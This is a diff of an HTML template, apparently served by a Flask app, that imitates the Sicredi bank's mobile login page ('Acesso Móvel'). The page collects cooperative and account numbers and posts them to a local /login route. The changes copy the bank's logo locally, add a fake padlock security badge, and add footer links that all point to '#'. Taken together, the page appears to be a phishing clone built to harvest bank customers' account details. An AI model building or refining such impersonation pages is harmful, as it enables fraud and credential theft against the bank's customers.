@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sicredi - Acesso Móvel</title>
+    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
     <style>
         :root {
             --sicredi-green: #3fa110;
@@ -12,50 +13,102 @@
             --text-gray: #333;
             --border-gray: #cdd3cd;
         }
-        body { font-family: 'Helvetica', Arial, sans-serif; background-color: var(--bg-gray); margin: 0; padding: 0; color: var(--text-gray); }
+
+        /* Garante que o corpo ocupe toda a altura da tela */
+        html, body { 
+            height: 100%; 
+            margin: 0; 
+            padding: 0; 
+        }
+
+        body { 
+            display: flex; 
+            flex-direction: column; 
+            font-family: 'Helvetica', Arial, sans-serif; 
+            background-color: var(--bg-gray); 
+        }
+
+        /* O wrapper cresce para empurrar o footer */
+        .main-wrapper { 
+            flex: 1 0 auto; 
+        }
+
         header { background-color: #fff; padding: 20px; text-align: center; border-bottom: 4px solid var(--sicredi-green); }
         .logo-img { max-width: 150px; height: auto; }
+        
         .main-container { padding: 20px; max-width: 500px; margin: 0 auto; }
         .login-card { background: #fff; border-radius: 8px; padding: 24px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         h2 { color: var(--sicredi-green); margin-top: 0; font-size: 22px; }
+        
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
-        input[type="text"], input[type="number"] { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid var(--border-gray); border-radius: 4px; font-size: 16px; }
+        input { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid var(--border-gray); border-radius: 4px; font-size: 16px; }
+        
         .btn-primary { background-color: var(--sicredi-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .btn-primary:active { background-color: var(--sicredi-dark-green); }
-        .info-section { margin-top: 30px; background: #fff; border-radius: 8px; padding: 15px; border-left: 5px solid #ffcc00; }
-        footer { background-color: var(--sicredi-dark-green); color: white; text-align: center; padding: 15px 0; font-size: 12px; margin-top: 40px; }
+
+        /* CENTRALIZAÇÃO DO CADEADO */
+        #divBlindagem {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 0;
+            width: 100%;
+        }
+
+        /* FOOTER NO FIM DA PÁGINA */
+        #footer {
+            flex-shrink: 0;
+            background-color: var(--sicredi-dark-green);
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            width: 100%;
+        }
+        
+        .footer-links { display: flex; justify-content: center; gap: 15px; margin-top: 10px; }
+        #footer a { font-size: 13px; color: white; text-decoration: underline; }
     </style>
 </head>
 <body>
-    <header>
-        <img src="https://www.sicredi.com.br/static/portal/img/logo-sicredi.svg" alt="Sicredi" class="logo-img">
-    </header>
 
-    <div class="main-container">
-        <div class="login-card">
-            <h2>Acessar Conta</h2>
-            
-            <form id="loginForm" action="/login" method="POST">
-                <div class="form-group">
-                    <label for="coop">Cooperativa</label>
-                    <input type="number" id="coop" name="coop" placeholder="0000" required>
-                </div>
+    <div class="main-wrapper">
+        <header>
+            <img src="logosicredi-home.jpg" alt="Sicredi" class="logo-img"> 
+        </header>
 
-                <div class="form-group">
-                    <label for="conta">Conta (com dígito)</label>
-                    <input type="text" id="conta" name="conta" placeholder="00000-0" required>
-                </div>
-
-                <button type="submit" class="btn-primary">
-                    ACESSAR
-                </button>
-            </form>
+        <div class="main-container">
+            <div class="login-card">
+                <h2>Acessar</h2>
+                <form id="loginForm" action="/login" method="POST">
+                    <div class="form-group">
+                        <label for="coop">Cooperativa</label>
+                        <input type="number" id="coop" name="coop" placeholder="0000" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="conta">Conta (com dígito)</label>
+                        <input type="text" id="conta" name="conta" placeholder="00000-0" required>
+                    </div>
+                    <button type="submit" class="btn-primary">ACESSAR</button>
+                </form>
+            </div>
         </div>
+
+        <section id="divBlindagem">
+            <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                <circle cx="32" cy="32" r="31" stroke="#3FA110" stroke-width="2"/>
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M24.5166 27.41C24.5193 27.41 24.5219 27.41 24.5246 27.41C24.5273 27.41 24.5299 27.41 24.5326 27.41H39.4674C39.4701 27.41 39.4728 27.41 39.4754 27.41C39.4781 27.41 39.4808 27.41 39.4834 27.41H44.5881C45.313 27.41 45.9017 27.9714 45.9017 28.662V46.748C45.9017 47.4397 45.3139 48 44.5881 48H19.412C18.6862 48 18.0984 47.4397 18.0984 46.748V28.662C18.0984 27.9714 18.6871 27.41 19.412 27.41H24.5166ZM40.5246 25.41H44.5881C46.4721 25.41 48 26.8671 48 28.662V46.748C48 48.5443 46.4727 50 44.5881 50H19.4119C17.5273 50 16 48.5443 16 46.748V28.662C16 26.8671 17.5279 25.41 19.4119 25.41H23.4754V18.124C23.4754 13.6374 27.2924 10 32.0011 10C36.708 10 40.5246 13.6377 40.5246 18.124V25.41ZM38.4262 25.41V18.124C38.4262 14.7423 35.5491 12 32.0011 12C28.4512 12 25.5738 14.742 25.5738 18.124V25.41H38.4262ZM26.5091 36.9975C26.0994 36.607 25.4351 36.607 25.0254 36.9975C24.6157 37.388 24.6157 38.0212 25.0254 38.4117L29.5578 42.7317C29.987 43.1407 30.6895 43.1185 31.0892 42.6832L39.0231 34.0432C39.4048 33.6276 39.3607 32.9959 38.9246 32.6321C38.4886 32.2684 37.8258 32.3104 37.4441 32.726L30.2487 40.5618L26.5091 36.9975Z" fill="#3FA110"/>
+            </svg>
+        </section>
     </div>
 
-    <footer>
-        <p>&copy; 2026 Sicredi - Todos os direitos reservados.</p>
+    <footer id="footer">
+        <p style="margin: 0;">&copy; 2026 Sicredi - Todos os direitos reservados.</p>
+        <div class="footer-links">
+            <a href="#">Perguntas Frequentes</a>
+            <a href="#">Rede de Atendimento</a>
+            <a href="#">Segurança</a>
+        </div>
     </footer>
+
 </body>
 </html>
